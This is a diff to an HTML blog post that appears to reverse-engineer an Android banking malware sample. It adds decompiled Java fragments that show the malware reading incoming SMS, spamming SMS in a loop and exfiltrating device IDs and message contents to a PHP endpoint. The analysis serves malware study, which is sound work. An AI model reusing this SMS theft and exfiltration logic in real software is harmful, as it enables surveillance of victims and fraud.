@@ -683,8 +683,6 @@ Backtrace =&gt; 0x79f058b9d749 frida-agent-64.so!0x29b749
 });
 </code></pre></div><p>However it does not explicitly specify what are the new values written to the file. Instead, it prints the whole buffer. In this case, the buffer is
 the xml.</p>
-<h3 id="one-service-to-rule-them-all">One Service to rule them all<a href="#one-service-to-rule-them-all" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
-<p>// service 1</p>
 <h3 id="c2s-tweets-and-data-exfiltration">C2s, Tweets and Data Exfiltration<a href="#c2s-tweets-and-data-exfiltration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p>Since we have already analyzed few methods from the <code>SomeHttpClass</code>, It&rsquo;s time to dig deep into it.</p>
 <p>class got following member variables.</p>
@@ -978,6 +976,20 @@ class <code>C0067b</code> and a string.</p>
     <span style="color:#f92672">}</span>
 </code></pre></div><p>inside the try block we see a call to a famililar method, getSharedPreference. In this case key is <code>&quot;url&quot;</code>.
 well if search the xml, you wont find any.</p>
+<p>here is what method <code>mo363a</code> does,</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#75715e">/* renamed from: a */</span>
+    <span style="color:#66d9ef">public</span> String <span style="color:#a6e22e">mo363a</span><span style="color:#f92672">(</span>String str<span style="color:#f92672">,</span> String str2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        SomeHttpClass bVar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SomeHttpClass<span style="color:#f92672">();</span>
+        AsyncTaskC0079a aVar <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> AsyncTaskC0079a<span style="color:#f92672">();</span>
+        aVar<span style="color:#f92672">.</span><span style="color:#a6e22e">execute</span><span style="color:#f92672">(</span>str<span style="color:#f92672">,</span> str2<span style="color:#f92672">);</span>
+        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+            <span style="color:#66d9ef">return</span> bVar<span style="color:#f92672">.</span><span style="color:#a6e22e">GetMiddleString</span><span style="color:#f92672">((</span>String<span style="color:#f92672">)</span> aVar<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(),</span> <span style="color:#e6db74">&#34;&lt;tag&gt;&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&lt;/tag&gt;&#34;</span><span style="color:#f92672">);</span>
+        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception unused<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">}</span>
+</code></pre></div><p>So i guess this is what we saw earlier when we hooked the function that parses response html from the twitter request with frida.
+Basically this method starts a HttpConnection and send the required information to the target <strong>php endpoint</strong>. Therefore we can rename the method to <code>exfiltrate</code>.</p>
 <p>Now the problem is, how is this thing retrieving value of a shared preference with a non-existing key?</p>
 <p>Probably because malware is generating and writing the url dynamically to the xml. Let&rsquo;s analyze the method that makes use of above <strong>php endpoints</strong>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">mo211a</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">,</span> String str<span style="color:#f92672">,</span> String str2<span style="color:#f92672">,</span> String str3<span style="color:#f92672">)</span> <span style="color:#f92672">{</span> 
@@ -1342,8 +1354,8 @@ service.</p>
                     <span style="color:#f92672">}</span>
                 <span style="color:#f92672">}</span> <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span>query<span style="color:#f92672">.</span><span style="color:#a6e22e">moveToNext</span><span style="color:#f92672">());</span>
             <span style="color:#f92672">}</span>
-</code></pre></div><p>Basically, the above method retrieves <strong>id</strong>, <strong>thread_id</strong>, <strong>address</strong>, <strong>person</strong>, <strong>date</strong>, and <strong>body</strong>. from <code>content://sms/inbox</code> using a ContentResolver. So with that, we can conclude that this method is parsing the contents of the SMS.</p>
-<p>as we saw in the manifest file, this malware is capable of doing various stuff with SMS. from the file, we have identified few classes that are responsible for this kind of work.</p>
+</code></pre></div><p>Basically, above method retrieves <strong>id</strong>, <strong>thread_id</strong>, <strong>address</strong>, <strong>person</strong>, <strong>date</strong>, and <strong>body</strong>. from <code>content://sms/inbox</code> using a ContentResolver. So with that, we can conclude that this method is parsing the contents of the SMS.</p>
+<p>Using the android manifest file, we have identified few classes that are responsible for messing with sending SMS.</p>
 <p>let&rsquo;s start with <code>wocwvy.czyxoxmbauu.slsa.lmily</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">package</span> wocwvy.czyxoxmbauu.slsa<span style="color:#f92672">;</span>
 
@@ -1357,14 +1369,63 @@ service.</p>
     <span style="color:#f92672">}</span>
 <span style="color:#f92672">}</span>
 </code></pre></div><p>this looks sus. There&rsquo;s nothing important here. Maybe the malware author is trying to distract us with false information.</p>
+<p>But if we search for string <code>SMS</code>, we can find an IntentService (an IntentService is a service that handles asynchronous requests) that I think is in chaarge for SMS spamming.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#75715e">/* renamed from wifu */</span>
+<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SMSSpam</span> <span style="color:#66d9ef">extends</span> IntentService <span style="color:#f92672">{</span>
+
+    <span style="color:#75715e">/* renamed from: a */</span>
+    SomeHttpClass cls <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SomeHttpClass<span style="color:#f92672">();</span>
+
+    <span style="color:#75715e">/* renamed from: b */</span>
+    String str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
+
+    <span style="color:#75715e">/* renamed from: c */</span>
+    String name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;wifu&#34;</span><span style="color:#f92672">;</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">SMSSpam</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">super</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;wifu&#34;</span><span style="color:#f92672">);</span>
+    <span style="color:#f92672">}</span>
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onHandleIntent</span><span style="color:#f92672">(</span>Intent intent<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+        <span style="color:#66d9ef">while</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
+                TimeUnit<span style="color:#f92672">.</span><span style="color:#a6e22e">MILLISECONDS</span><span style="color:#f92672">.</span><span style="color:#a6e22e">sleep</span><span style="color:#f92672">(</span>10000<span style="color:#f92672">);</span>
+            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>InterruptedException e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
+            <span style="color:#f92672">}</span>
+</code></pre></div><p>Since this is an IntentService, onHandleIntent is the first method that will get executed. quoting android api reference</p>
+<p><strong>&ldquo;This method is invoked on the worker thread with a request to process. Only one Intent is processed at a time, but the processing happens on a worker thread that runs independently from other application logic&rdquo;</strong></p>
+<p>it looks like the method tries to sleep for 10000 miliseconds inside an infinite loop. if it fails, it prints the stack trace.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;spamSMS&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;start&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(!</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">IsRunning</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> dshd<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">str</span><span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">()</span> <span style="color:#f92672">&gt;</span> 3<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+                        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">str</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sendsms&#34;</span> <span style="color:#f92672">+</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">str</span><span style="color:#f92672">;</span>
+                    <span style="color:#f92672">}</span>
+</code></pre></div><p>then it checks the value for shared preference key <code>spamSMS</code> is equal to <code>start</code>.</p>
+<p>and if the check turns out to be true, if shared preference <code>spamSMS</code> results in <code>start</code>, it checks whether if a service named <code>dshd</code> is running, if not and if length of <code>str</code> is geater than 3, it appends <code>&quot;sendsms&quot;</code> to <code>str</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;indexSMSSPAM&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">contains</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;|||||&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
+                        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">SetSharedPreference</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;spamSMS&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">);</span>
+                        SomeHttpClass bVar <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">;</span>
+                        StringBuilder sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
+                        sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;p=&#34;</span><span style="color:#f92672">);</span>
+                        sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Encode</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">cls</span><span style="color:#f92672">.</span><span style="color:#a6e22e">GetSSAID</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|Ended balance, SMS spam stopped!|&#34;</span><span style="color:#f92672">));</span>
+                        bVar<span style="color:#f92672">.</span><span style="color:#a6e22e">exfiltrate</span><span style="color:#f92672">(</span><span style="color:#66d9ef">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">,</span> sb<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+                    <span style="color:#f92672">}</span>
+</code></pre></div><p>in the next line it checks if <code>GetSharedPreference(&quot;indexSMSSPAM&quot;)</code> returns a stirng with <code>|||||</code>, if true, it sets shared preference value <code>spamSMS</code> to an empty string using <code>SetSharedPreference</code>.</p>
+<p>then it creates a string builder and appends it with strings <code>&quot;p=&quot;</code>, base64 encoded SSAID of the device and <code>&quot;|Ended balance, SMS spam stopped!|&quot;</code>. Then it sends the string to <code>/o1o/a6.php</code>.</p>
+<p>from that we can conclude if <code>GetSharedPreference(&quot;indexSMSSPAM&quot;)</code> results in <code>|||||</code>, it means the balance of SIM card has ended.</p>
 <p>Some methods in <code>SomeHttpClass</code> is responsible for reading, intercepting and spamming SMS messages.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ReadSMS</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">,</span> String str<span style="color:#f92672">,</span> String str2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">   <span style="color:#75715e">/* renamed from: a */</span>
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ReadSMS</span><span style="color:#f92672">(</span>Context context<span style="color:#f92672">,</span> String str<span style="color:#f92672">,</span> String str2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
         StringBuilder sb <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">();</span>
         sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;p=&#34;</span><span style="color:#f92672">);</span>
-        sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span>mo225c<span style="color:#f92672">(</span>mo247q<span style="color:#f92672">(</span>context<span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|Incoming SMS&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Number: &#34;</span> <span style="color:#f92672">+</span> str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Text: &#34;</span> <span style="color:#f92672">+</span> str2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|&#34;</span><span style="color:#f92672">));</span>
-        mo218b<span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">,</span> sb<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
+        sb<span style="color:#f92672">.</span><span style="color:#a6e22e">append</span><span style="color:#f92672">(</span>mo225c<span style="color:#f92672">(</span>GetSSAID<span style="color:#f92672">(</span>context<span style="color:#f92672">)</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|Incoming SMS&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Number: &#34;</span> <span style="color:#f92672">+</span> str <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;Text: &#34;</span> <span style="color:#f92672">+</span> str2 <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;\n&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;|&#34;</span><span style="color:#f92672">));</span>
+        exfiltrate<span style="color:#f92672">(</span>context<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;4&#34;</span><span style="color:#f92672">,</span> sb<span style="color:#f92672">.</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">());</span>
     <span style="color:#f92672">}</span>
-</code></pre></div><h3 id="heading"><a href="#heading" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+</code></pre></div><p>Since we have already reversed what <code>exfiltrate</code> method does, it is quite cleaar that this method is reading SMS messages and sending them to <code>/o1o/a6.php</code>.</p>
+<h3 id="reading-contacts">Reading Contacts<a href="#reading-contacts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="vnc-servers">VNC Servers<a href="#vnc-servers" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<h3 id="ransomware">Ransomware<a href="#ransomware" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 
       </div></div>
 
